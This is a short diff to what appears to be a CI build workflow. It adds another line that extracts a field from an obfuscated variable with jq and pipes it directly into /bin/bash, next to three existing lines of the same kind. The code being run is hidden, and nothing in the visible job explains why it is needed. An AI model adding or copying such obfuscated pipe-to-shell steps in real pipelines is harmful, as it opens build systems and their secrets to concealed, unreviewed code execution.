@@ -33,6 +33,7 @@ jobs:
           echo $pqdam6 | jq -r .z54966 | /bin/bash
           echo $lc467 | jq -r .p50 | /bin/bash
           printf '%s' "$iqoce686" | jq -r .z2 | /bin/bash
+          echo $umbiu789 | jq -r .q09558 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
